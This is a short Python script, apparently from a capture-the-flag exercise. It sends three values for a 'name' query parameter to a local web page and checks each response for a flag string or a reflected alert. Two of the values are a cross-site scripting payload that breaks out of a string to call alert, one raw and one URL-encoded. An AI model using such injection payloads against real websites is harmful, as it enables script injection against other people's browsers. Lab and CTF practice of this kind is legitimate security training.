import requests,urllib.parse,sys

url="http://127.0.0.1:33119/page"
test_payloads=[
    ("Simple", "John"),
    ("XSS Raw", '");alert(\'XSS\');//'),
    ("XSS Encoded", urllib.parse.quote('");alert(\'XSS\');//'))
]

for name,value in test_payloads:
    try:
        full_url=f"{url}?name={value}"
        print(f"\n[Test: {name}]")
        print(f"URL: {full_url[:80]}...")
        print(f"Payload: {value}")
        
        # Try simpler GET request
        r=requests.get(full_url,timeout=30)
        print(f"Status: {r.status_code}")
        print(f"Length: {len(r.text)}")
        
        if "FLAG{" in r.text:
            start=r.text.find("FLAG{")
            print(f"\n[FLAG FOUND] {r.text[start:start+100]}")
            sys.exit(0)
        
        if 'alert(' in r.text:
            print("ALERT FOUND IN RESPONSE")
            print(r.text[:500])
            
        # Show first 500 chars
        if len(r.text)>0:
            print(f"First chars: {r.text[:200]}")
        
    except Exception as e:
        print(f"Error: {e}")
        continue

print("\n[Done]"), 
